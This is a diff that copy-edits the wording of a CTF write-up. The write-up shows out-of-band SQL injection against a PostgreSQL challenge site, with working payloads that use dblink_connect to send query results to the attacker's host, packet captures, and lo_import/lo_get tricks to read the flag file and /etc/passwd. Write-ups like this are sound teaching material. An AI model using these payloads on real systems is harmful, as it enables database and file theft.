@@ -21,24 +21,24 @@ http://challenges.fbctf.com:8081
 - We can't perform In-Band SQL Injection or Inferential (Blind) SQL Injection because everything is run in the background (we can only know if the syntax and semantic are correct or not).
 - Out-of-Band SQL Injection can be performed by using SQL SSRF via `dblink_connect` to establish a connection to our remote server so we can get the query result through DNS request or raw network dump (`(SELECT dblink_connect('host=HOST user=' || (QUERY) || ' password=PASSWORD dbname=DBNAME'))`).
 - The current PostgreSQL user is allowed to use `lo_import` to load a file into `pg_largeobject` catalog but doesn't have permission to perform `SELECT` on `pg_largeobject` nor using `lo_get` for new object's `oid`.
-- We can get the list of all `oid` through `pg_largeobject_metadata` and then try to use `lo_get` for old `oid` to see if secret/flag file has been loaded before and the user used is allowed to load it.
-- The flag file has been loaded in the past with `oid` 16444 so we can get it by using `lo_get(16444)`!
+- We can get the list of all `oid` through `pg_largeobject_metadata` and then try to use `lo_get` for old `oid` to see if secret/flag file has been loaded before and the current user is allowed to load it.
+- The flag file has been loaded in the past with `oid` 16444 so we can get its content by using `lo_get(16444)`!
 
 ### Detailed Steps
 
-This website has a simple dashboard with a feature to search employees (`?employee_search=`). From the error message, we can know if there is a file named `secret` in `/var/lib/postgresql/data/` so we can assume if that file is the flag and this website uses PostgreSQL. Another feature for searching user seems disabled on the front-end but we can still access it by requesting to its parameter. We can know the parameter by viewing it in the source code.
+This website has a simple dashboard with a feature to search employees (`?employee_search=`). From the error message, we can know there is a file named `secret` in `/var/lib/postgresql/data/`. We can assume if that file is the flag file and this website uses PostgreSQL. There is one feature to search users but it seems to be disabled on the front-end. We can still access the feature by requesting to its parameter. By looking in the source code, we can know that the parameter name is `user_search`.
 
 ![](user-search.png)
 
-Querying user with this feature has produced nothing. No results or whatsoever on the website. But, if the search value contains single quote and we refresh the page again, the website will displays a warning message. Seems like it uses session-based warning message and delay to prevent automatic scanner.
+The use of this feature has produced nothing. There are no results or anything on the website. However, if the search value contains a single quote and we refresh the page again, the website will display a warning message. It seems that it uses session-based warning messages and delays to prevent automatic scanners.
 
 ![](warning.png)
 
-Closing the value with SQL comment will produce no warning. Again, we might need to refresh the page.
+Closing the value with SQL comment will not produce a warning. Again, we might need to refresh the page.
 
 ![](no-warning.png)
 
-We can try several PostgreSQL queries to find out which query that will produce the warning message and not. To make sure, we can refresh the page multiple times for each query.
+We can try a number of PostgreSQL queries to find out which query that will generate a warning message and not. To be sure, we can refresh the page multiple times for each query.
 
 - `asd' and 1=0 --`, no warning
 - `asd' and 1=1 --`, no warning
@@ -54,42 +54,40 @@ We can try several PostgreSQL queries to find out which query that will produce 
 - `asd' union select 1,chr(65) --`, no warning
 - `asd' union select 1,chr(-65) --`, no warning
 
-From obeserved behaviors, we can assume if the warning message only showed up when there is a syntax or semantic error in the query. If we select a non-existing database it will shows a warning message because SQL will check for table name, field name, data type, etc. during semantic check. But, it will not shows a warning message when `chr(-65)` is performed because it is syntactically and semantically correct although it will cause error during execution. Because the `pg_sleep` also doesn't cause delay, we can safely assume if query execution occurs in the background or asynchronously.
+From obeserved behaviors, we can assume if the warning message only appears when there is a syntax or semantic error in the query. Because the `pg_sleep` also doesn't cause delay, we can safely assume if query execution occurs in the background or asynchronously. In this case, we can't use common SQL Injection tricks like In-Band SQL Injection or Inferential/Blind SQL Injection.
 
-Since no any page changes other than warning message for syntax/semantic error and no meaningful inferential observation can be performed, we can't use common SQL Injection tricks like In-Band SQL Injection or Inferential/Blind SQL Injection.
+Quick googling about running PostgreSQL query asynchronously yield an information about `dblink` (https://www.postgresql.org/docs/11/dblink.html). It's a module that supports connections to other PostgreSQL databases (or to the same database) from within a database session. It provides `dblink_send_query` to sends a query to be executed  asynchronously. This module is not enabled by default but it is possible this module is enabled in this case.
 
-Quick googling about running PostgreSQL query asynchronously or in the background yield an information about `dblink` (https://www.postgresql.org/docs/11/dblink.html). It's a module that supports connections to other PostgreSQL databases (or to the same database) from within a database session. It provides `dblink_send_query` to sends a query to be executed  asynchronously. This module is not enabled by default but there is a high possibility that this module is enabled in this case.
-
-Query that contains `dblink_connect` doesn't cause warning so `dblink` might be enabled.
+We can see that the query containing `dblink_connect` doesn't cause a warning so `dblink` may be enabled.
 
 ![](dblink-connect.png)
 
-Normally, `dblink_connect` can be used to open a persistent connection to a remote PostgreSQL database. Example: `SELECT dblink_connect('host=HOST user=USER password=PASSWORD dbname=DBNAME')`. Because we can control the parameter of this function, we can perform SQL Server Side Request/Connection Forgery to our own host. That means we can perform Out-of-Band SQL Injection to exfiltrate data. At least, there are two ways to get the data from server:
+Normally, `dblink_connect` can be used to open a persistent connection to a remote PostgreSQL database (e.g. `SELECT dblink_connect('host=HOST user=USER password=PASSWORD dbname=DBNAME')`). Because we can control the parameter of this function, we can perform SQL Server Side Request Forgery to our own host. That means, we can perform Out-of-Band SQL Injection to exfiltrate data from SQL query results. At least, there are two ways to do this:
 
-1. Set up a DNS server and then trigger the connection to `[data].our.domain` so we can see the data in the log or in DNS network packet.
-2. Set up a public PostgreSQL server, monitor incoming packet to PostgreSQL port, and then trigger the connection to our host with exfiltrated data as `user`/`dbname`. By default, PostgreSQL doesn't use SSL for communication so we can see `user`/`dbname` as plaintext in the network.
+1. Set up a DNS server and then trigger the connection to `[data].our.domain` so that we can see the data in the log or in the DNS network packets.
+2. Set up a public PostgreSQL server, monitor the incoming netowrk packets to PostgreSQL port, and then trigger a connection to our host with exfiltrated data as `user`/`dbname`. By default, PostgreSQL doesn't use SSL for communication so we can see `user`/`dbname` as a plaintext on the network.
 
-Second way is easier because we don't need any domain. We only need to set up a server with public IP, install PostgreSQL, set the PostgreSQL service to listen to \*/0.0.0.0, and run network dumper (e.g. tcpdump) to monitor the traffic to PostgreSQL port (5432 by default).
+The second method is easier because we don't need any domain. We only need to set up a server with a public IP, install PostgreSQL, set the PostgreSQL service to listen to \*/0.0.0.0, and run a network dumper (e.g. tcpdump) to monitor traffic to the PostgreSQL port (5432 by default).
 
-To set PostgreSQL so it will listen to public, set `listen_addresses` in `postgresql.conf` to `*`.
+To set PostgreSQL so that it will listen to the public, set `listen_addresses` in `postgresql.conf` to `*`.
 
 ```
 listen_addresses = '*'
 ```
 
-To monitor the incoming traffics, run `tcpdump` to monitor port 5432.
+To monitor incoming traffic, run `tcpdump` to monitor port 5432.
 
 ```
 sudo tcpdump -nX -i eth0 port 5432
 ```
 
-To see if we get the connection from target, we can try to use this query:
+To see if we get a connection from the target, we can try using this query:
 
 ```
 asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=farisv password=postgres dbname=hellofromfb')) --
 ```
 
-If success, we got a nice piece of network packet with `user` and `dbname`.
+If successful, we get a piece of network packet with readable `user` and `dbname`.
 
 ```
 17:14:11.267060 IP [54.185.163.254.50968] > [REDACTED]: Flags [P.], seq 1:43, ack 1, win 229, options [nop,nop,TS val 970078525 ecr 958693110], length 42
@@ -101,9 +99,9 @@ If success, we got a nice piece of network packet with `user` and `dbname`.
     0x0050:  0068 656c 6c6f 6672 6f6d 6662 0000       .hellofromfb.
 ```
 
-Then, we can proceed to exfiltrate the database using some PostgreSQL queries. Note that for any query result that contains whitespaces, we need to convert the result to hex/base64 with `encode` function or replace the whitespace to other character with `replace` function because it will causes execution error in `dblink_connect`.
+Then, we can continue to extract the database using several PostgreSQL queries. Note that for each query result that contains whitespaces, we need to convert the result to hex/base64 with `encode` function or replace the whitespace to other character with `replace` function because it will cause an execution error during `dblink_connect` process.
 
-Get the list of schema:
+Get a list of schemas:
 
 ```
 asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(schema_name,':') FROM information_schema.schemata) || ' password=postgres dbname=postgres')) --
@@ -121,7 +119,7 @@ asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg
     0x0070:  6f73 7467 7265 7300 00                   ostgres.
 ```
 
-Get the list of tables in current schema:
+Get a list of tables in current schema:
 
 ```
 asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(tablename, ':') FROM pg_catalog.pg_tables WHERE schemaname=current_schema()) || ' password=postgres dbname=postgres')) --
@@ -153,9 +151,9 @@ asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT COUNT(*) F
     0x0050:  6772 6573 0000                           gres.
 ```
 
-Seems like it only has one empty table in the current schema and the flag is not in database. By the hint on the website, we may need to exfiltrate the data from `/var/lib/postgresql/data/secret`. If we try to use `pg_read_file` or `pg_read_binary_file` to read the file, we will not get any incoming connection so the current user may not have permission to use those functions.
+It looks like it only has one empty table in the current schema and the flag is not in the database. We may really need to exfiltrate data from `/var/lib/postgresql/data/secret`. Unfortunately, if we try to use `pg_read_file` or `pg_read_binary_file` to read the file, we will not get an incoming connection so that the current user may not have permission to use these functions.
 
-Other alternative to read the file is using large objects (https://www.postgresql.org/docs/11/lo-funcs.html). We can use `lo_import` to load a file content to `pg_largeobject` catalog. If the query is success, we will get the object's `oid`.
+The alternative to reading files is to use large objects (https://www.postgresql.org/docs/11/lo-funcs.html). We can use `lo_import` to load the contents of the file into the `pg_largeobject` catalog. If the query is success, we will get the object's `oid`.
 
 ```
 asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT lo_import('/var/lib/postgresql/data/secret')) || ' password=postgres dbname=postgres')) --
@@ -171,11 +169,11 @@ asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT lo_import(
     0x0050:  706f 7374 6772 6573 0000                 postgres..
 ```
 
-We got 24668 as `oid` so it means that we can use `lo_import` function. Unfortunately, we will not get any results if we try to select the content of large object using `lo_get(24668)` or directly accessing `pg_largeobject` catalog. Seems like the current user doesn't have permission to read the content of new object.
+We got 24668 as `oid` so that means we can use `lo_import` function. Unfortunately, we won't get any results if we try to get the content of large object using `lo_get(24668)` or directly access the `pg_largeobject` catalog. It looks like the current user doesn't have permission to read the content of new objects.
 
-After reading the documentation of large objects in PostgreSQL, we can know if large objects can has ACL (Access Control List). That means, if there is an old object with ACL that allows current user to read it, then we can exfiltrate that object's content.
+After reading the documentation of large objects in PostgreSQL, we can find out that large objects can has ACL (Access Control List). That means, if there is an old object with an ACL that allows current user to read it, then we can exfiltrate that object's content.
 
-We can get the list of available large object's `oid` by extracting from `pg_largeobject_metadata`.
+We can get a list of available large object's `oid` by extracting from `pg_largeobject_metadata`.
 
 ```
 asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(cast(l.oid as text), ':') FROM pg_largeobject_metadata l) || ' password=postgres dbname=postgres')) --
@@ -199,9 +197,9 @@ asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg
 .....
 ```
 
-We got a bunch of `oid`s. We can try use `lo_get` to load the object's content. For example, `lo_get(16439)` will load the content of `/etc/passwd`. If we want to load it, we need to handle the whitespaces first (e.g. convert to hex/base64). Because the result of `lo_gets` is `bytea`, we need to convert it to `UTF8` so it can be appended in the query.
+We got a bunch of `oid`s. We can try using `lo_get` to load object's content. For example, `lo_get(16439)` will load the content of `/etc/passwd`. Because the result of `lo_gets` is `bytea`, we need to convert it to `UTF8` so that it can be appended in the query.
 
-We can try to load some objects with lowest `oid`. The flag is in object with `oid` 16444. No whitespaces in the flag so we can just display it as is.
+We can try to load some objects with lowest `oid`. The flag is in object with `oid` 16444. There are no whitespaces in the flag so we can just display it as is.
 
 To load the flag:
 
